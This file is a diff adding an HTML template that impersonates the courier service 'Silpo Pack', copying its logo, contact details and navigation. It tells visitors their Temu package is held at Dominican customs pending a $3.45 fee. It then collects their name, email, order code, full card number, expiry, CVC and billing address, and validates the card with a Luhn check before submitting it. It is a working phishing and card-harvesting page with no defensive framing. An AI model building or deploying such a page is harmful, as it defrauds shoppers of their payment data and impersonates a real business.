@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Silpo Pack - Soporte y Pagos</title>
+<link rel="icon" type="image/png" href="https://silposystems.com/wp-content/uploads/2024/05/unnamed.jpeg">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+  :root{
+    --blue:#003d99;
+    --blue-dark:#002b66;
+    --bg:#f6f8fb;
+    --card:#ffffff;
+    --muted:#6b7a90;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    font-family:Inter,system-ui,Arial,sans-serif;
+    background:var(--bg);
+    color:#001a33;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    min-height:100vh;
+    padding:0;
+  }
+  .card{
+    width:420px;
+    background:var(--card);
+    border-radius:12px;
+    box-shadow:0 10px 30px rgba(10,20,40,0.08);
+    padding:28px;
+    margin:30px 0;
+  }
+  .brand{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+  .logo{width:44px;height:44px;border-radius:8px;background:var(--blue);display:inline-block;}
+  h1{margin:0;font-size:20px;color:var(--blue-dark)}
+  .subtitle{margin:6px 0 18px;color:var(--muted);font-size:13px}
+  form{display:flex;flex-direction:column;gap:10px}
+  .row{display:flex;gap:10px}
+  .col{flex:1}
+  input, select, textarea{
+    width:100%;
+    padding:12px 14px;
+    border-radius:8px;
+    border:1px solid #e3e8ef;
+    background:#fbfdff;
+    font-size:14px;
+    color:#001a33;
+  }
+  input:focus{outline:none;border-color:var(--blue)}
+  .btn{
+    background:var(--blue);
+    color:#fff;
+    border:none;
+    padding:12px 14px;
+    border-radius:8px;
+    font-weight:600;
+    cursor:pointer;
+    margin-top:8px;
+  }
+  .btn.secondary{background:#fff;color:var(--blue);border:1px solid #dbe6fb}
+  .muted{color:var(--muted);font-size:13px}
+  .small{font-size:13px;color:var(--muted)}
+  .card-info{font-size:13px;margin-top:-6px;margin-bottom:5px;height:18px;color:var(--blue-dark)}
+  .error-text{color:red;font-size:12px;height:16px;margin-top:-5px;}
+  @media (max-width:480px){.card{width:100%}.row{flex-direction:column}}
+
+  /* BARRA SUPERIOR E INFERIOR */
+  .top-bar {
+    background-color: #12123D;
+    color: white;
+    display: flex;
+    justify-content: flex-start;
+    align-items: center;
+    gap: 40px;
+    padding: 10px 40px;
+    font-size: 17px;
+    font-weight: 500;
+    width: 100%;
+  }
+  .top-item { display: flex; align-items: center; gap: 8px; }
+  .top-item svg { width: 17px; height: 17px; fill: white; }
+  .top-item a { color: white; text-decoration: none; }
+
+  .nav-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 15px 40px;
+    background-color: white;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    width: 100%;
+  }
+  .nav-left { display: flex; align-items: center; gap: 30px; }
+  .nav-logo img { width: 48px; height: 48px; object-fit: contain; }
+  .nav-links { display: flex; gap: 30px; align-items: center; }
+  .nav-links a { text-decoration: none; color: #0c0c3d; font-weight: 600; font-size: 18px; transition: color 0.3s; }
+  .nav-links a:hover { color: #12123D; }
+  .nav-buttons { display: flex; gap: 15px; }
+  .nav-buttons a { background-color: #0c0c3d; color: white; text-decoration: none; padding: 10px 20px; border-radius: 4px; font-weight: 500; display:flex; align-items:center; }
+  .nav-buttons a:hover { background-color: #1a1a60; }
+</style>
+</head>
+<body>
+
+  <!-- BARRA SUPERIOR -->
+  <div class="top-bar">
+    <div class="top-item">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M493.4 24.6l-104-24c-11.3-2.6-22.9 3.3-27.5 13.9l-48 112
+        c-4.2 9.8-1.4 21.3 6.9 28l60.6 49.6c-36 76.7-98.9
+        140.5-177.2 177.2l-49.6-60.6c-6.8-8.3-18.2-11.1-28-6.9l-112
+        48C3.9 366.5-2 378.1.6 389.4l24 104C27.1 504.2
+        36.7 512 48 512c256.1 0 464-207.5 464-464
+        0-11.2-7.7-20.9-18.6-23.4z"/></svg>
+      809 955 3550
+    </div>
+    <div class="top-item">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0
+        26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5
+        5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6
+        21.1 15.4 56.7 47.8 92.2 47.6
+        35.7.3 72-32.8 92.3-47.6
+        102-74.1 131.6-96.3 154-113.7zM256 320
+        c23.2.4 56.6-29.2 73.4-41.4
+        132.7-96.3 142.8-104.7 173.4-128.7
+        5.8-4.5 9.2-11.5 9.2-18.9v-19
+        c0-26.5-21.5-48-48-48H48
+        C21.5 64 0 85.5 0 112v19
+        c0 7.4 3.4 14.3 9.2 18.9
+        30.6 23.9 40.7 32.4 173.4 128.7
+        16.8 12.2 50.2 41.8 73.4 41.4z"/></svg>
+      <a href="mailto:info@silpoglobal.com">info@silpoglobal.com</a>
+    </div>
+    <div class="top-item">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M380.9 97.1C339 55.1 283.2 32 223.9
+        32c-122.4 0-222 99.6-222 222
+        0 39.1 10.2 77.3 29.6 111L0
+        480l117.7-30.9c32.4 17.7 68.9 27
+        106.1 27h.1c122.3 0 224.1-99.6
+        224.1-222 0-59.3-25.2-115-67.1-157zm-157
+        341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8
+        18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2
+        0-101.7 82.8-184.5 184.6-184.5
+        49.3 0 95.6 19.2 130.4
+        54.1 34.8 34.9 56.2 81.2 56.1
+        130.5 0 101.8-84.9 184.6-186.6
+        184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5
+        2.8-3.7 5.6-14.3 18-17.6
+        21.8-3.2 3.7-6.5 4.2-12
+        1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8
+        5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7
+        0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3
+        0 27.3 19.9 53.7 22.6 57.4 2.8 3.7
+        39.1 59.7 94.8 83.8 35.2 15.2 49
+        16.5 66.6 13.9 10.7-1.6 32.8-13.4
+        37.4-26.4 4.6-13
+        4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+      809 955 3550
+    </div>
+  </div>
+
+  <!-- BARRA INFERIOR -->
+  <div class="nav-bar">
+    <div class="nav-left">
+      <div class="nav-logo">
+        <img src="https://silposystems.com/wp-content/uploads/2024/05/unnamed.jpeg" alt="Logo">
+      </div>
+      <div class="nav-links">
+        <a href="#">Inicio</a>
+        <a href="#">Nuestras Oficinas</a>
+        <a href="#">Contacto</a>
+        <a href="#">Crea Tu Casillero Courier</a>
+      </div>
+    </div>
+
+    <div class="nav-buttons">
+      <a href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="15" height="15" fill="white" style="margin-right:6px;">
+          <path d="M152 64c-13.3 0-24 10.7-24 24v40H24C10.7 128 0 138.7 0 152v288c0 13.3 10.7 24 24 24h464c13.3 0 24-10.7 24-24V152c0-13.3-10.7-24-24-24H384V88c0-13.3-10.7-24-24-24H152zm0 64V88h208v40H152zm80 80v48h48v-48h-48z"/>
+        </svg>
+        Silpo Pack
+      </a>
+
+      <a href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="15" height="15" fill="white" style="margin-right:6px;">
+          <path d="M505 442.7L405.3 343c28.4-34.9 45.7-79.4 45.7-128C451 96.5 354.5 0 231 0S11 96.5 11 215s96.5 215 215 215c48.6 0 93.1-17.3 128-45.7L442.7 505c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6 0-33.9zM226 360c-79.5 0-144-64.5-144-144S146.5 72 226 72s144 64.5 144 144-64.5 144-144 144z"/>
+        </svg>
+        Rastrear Envío
+      </a>
+    </div>
+  </div>
+
+  <!-- TARJETA Y FORMULARIOS ORIGINALES -->
+  <div class="card">
+    <div class="brand">
+      <div class="logo"></div>
+      <div>
+        <h1>Silpo Pack</h1>
+        <div class="subtitle">Asistente profesional de soporte y gestión de pedidos</div>
+      </div>
+    </div>
+
+    {% if not mensaje and not pago %}
+    <!-- FORMULARIO INICIAL -->
+    <form action="/enviar" method="POST">
+      <input name="nombre" type="text" placeholder="Nombre completo" required>
+      <input name="correo" type="email" placeholder="Correo electrónico" required>
+      <input name="codigo" type="text" placeholder="Código de su pedido" required>
+      <button class="btn" type="submit">Enviar</button>
+    </form>
+
+    {% elif mensaje and not pago %}
+    <!-- MENSAJE DE CONFLICTO -->
+    <div style="margin-bottom:12px" class="muted">
+      {{ cliente.nombre }}, tu pedido de Temu tuvo un pequeño conflicto en la aduana dominicana.  
+      Para liberarlo rápidamente, necesitamos una pequeña comisión de $3.45.  
+      <br><br><b>[Pagar ahora ✅]</b>
+    </div>
+    <form action="/pago" method="POST">
+      <input type="hidden" name="nombre" value="{{ cliente.nombre }}">
+      <input type="hidden" name="correo" value="{{ cliente.correo }}">
+      <input type="hidden" name="codigo" value="{{ cliente.codigo }}">
+      <button class="btn" type="submit">Pagar ahora ✅</button>
+    </form>
+
+    {% elif pago %}
+    <!-- FORMULARIO DE PAGO -->
+    <div style="margin-bottom:12px" class="muted">Método de pago — Información de la tarjeta</div>
+    <form action="/procesar_pago" method="POST" id="pagoForm">
+      <input type="hidden" name="nombre" value="{{ cliente.nombre }}">
+      <input type="hidden" name="correo" value="{{ cliente.correo }}">
+      <input type="hidden" name="codigo" value="{{ cliente.codigo }}">
+
+      <div class="payment-grid">
+        <input id="cardNumber" name="card_number" type="text" placeholder="1234 1234 1234 1234" required>
+        <div id="cardInfo" class="card-info"></div>
+
+        <div class="row">
+          <input id="exp" name="exp" class="col" type="text" placeholder="MM / AA" required>
+          <input id="cvc" name="cvc" class="col" type="text" placeholder="CVC" required>
+        </div>
+        <div id="expError" class="error-text"></div>
+        <div id="cvcError" class="error-text"></div>
+
+        <input name="holder" type="text" placeholder="Nombre del titular de la tarjeta" required>
+        <div class="small">Dirección de facturación</div>
+        <select name="country" required>
+          <option value="República Dominicana">República Dominicana</option>
+        </select>
+        <input name="addr1" type="text" placeholder="Línea 1 de dirección" required>
+        <input name="addr2" type="text" placeholder="Línea 2 de dirección (opcional)">
+        <div class="row">
+          <button class="btn" type="submit">Confirmar pago</button>
+          <a href="/" class="btn secondary" style="text-decoration:none;text-align:center;">Cancelar</a>
+        </div>
+      </div>
+    </form>
+    {% endif %}
+  </div>
+
+  <footer style="position:fixed;bottom:0;left:0;width:100%;text-align:center;padding:10px 0;font-size:13px;color:#666;font-family:Inter, Arial, sans-serif;">
+    © 2025 SilpoPack. Todos los derechos reservados.
+  </footer>
+
+<script>
+const cardNumberInput = document.getElementById('cardNumber');
+const cardInfo = document.getElementById('cardInfo');
+const expInput = document.getElementById('exp');
+const cvcInput = document.getElementById('cvc');
+const expError = document.getElementById('expError');
+const cvcError = document.getElementById('cvcError');
+
+function validarLuhn(numero) {
+  const limpio = numero.replace(/\D/g, '');
+  let suma = 0, alternar = false;
+  for (let i = limpio.length - 1; i >= 0; i--) {
+    let n = parseInt(limpio[i]);
+    if (alternar) { n *= 2; if (n > 9) n -= 9; }
+    suma += n;
+    alternar = !alternar;
+  }
+  return (suma % 10 === 0);
+}
+
+function detectarMarca(numero) {
+  const limpio = numero.replace(/\D/g, '');
+  if (/^4/.test(limpio)) return "Visa";
+  if (/^5[1-5]/.test(limpio)) return "MasterCard";
+  if (/^3[47]/.test(limpio)) return "American Express";
+  if (/^6(?:011|5)/.test(limpio)) return "Discover";
+  if (/^35/.test(limpio)) return "JCB";
+  return "Desconocida";
+}
+
+if (cardNumberInput) {
+  cardNumberInput.addEventListener('input', () => {
+    const numero = cardNumberInput.value;
+    const marca = detectarMarca(numero);
+    if (numero.replace(/\D/g, '').length >= 13) {
+      if (validarLuhn(numero)) {
+        cardInfo.textContent = `✅ ${marca} — Tarjeta válida`;
+        cardInfo.style.color = "green";
+      } else {
+        cardInfo.textContent = `⚠️ ${marca} — Tarjeta inválida`;
+        cardInfo.style.color = "red";
+      }
+    } else { cardInfo.textContent = ""; }
+  });
+}
+
+function validarExp(fecha) {
+  const match = fecha.match(/^(\d{2})\s*\/\s*(\d{2})$/);
+  if (!match) return false;
+  const mes = parseInt(match[1], 10);
+  const año = 2000 + parseInt(match[2], 10);
+  if (mes < 1 || mes > 12) return false;
+  const ahora = new Date();
+  const expDate = new Date(año, mes - 1, 1);
+  return expDate >= new Date(ahora.getFullYear(), ahora.getMonth(), 1);
+}
+
+function validarCVC(cvc, marca) {
+  const limpio = cvc.replace(/\D/g, '');
+  if (marca === "American Express") return limpio.length === 4;
+  return limpio.length === 3;
+}
+
+const pagoForm = document.getElementById('pagoForm');
+if (pagoForm) {
+  pagoForm.addEventListener('submit', function(e){
+    const numero = cardNumberInput.value;
+    const exp = expInput.value;
+    const cvc = cvcInput.value;
+    const marca = detectarMarca(numero);
+    let valido = true;
+
+    cardInfo.textContent = "";
+    if (expError) expError.textContent = "";
+    if (cvcError) cvcError.textContent = "";
+
+    if (!validarLuhn(numero)) {
+      cardInfo.textContent = "⚠️ Número de tarjeta inválido";
+      cardInfo.style.color = "red";
+      valido = false;
+    }
+    if (!validarExp(exp)) {
+      if (expError) { expError.textContent = "⚠️ Fecha de expiración inválida o vencida"; expError.style.color="red"; }
+      valido = false;
+    }
+    if (!validarCVC(cvc, marca)) {
+      if (cvcError) { cvcError.textContent = "⚠️ CVC inválido"; cvcError.style.color="red"; }
+      valido = false;
+    }
+
+    if (!valido) { e.preventDefault(); return; }
+
+    // Spinner al enviar si todo es válido
+    const spinner = document.createElement('div');
+    spinner.innerHTML = `
+      <div style="border:5px solid #f3f3f3;border-top:5px solid #003d99;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:10px auto;"></div>
+      <p style="text-align:center;color:#555;">Procesando pago...</p>
+      <style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
+    `;
+    pagoForm.appendChild(spinner);
+  });
+}
+</script>
+
+</body>
+</html>
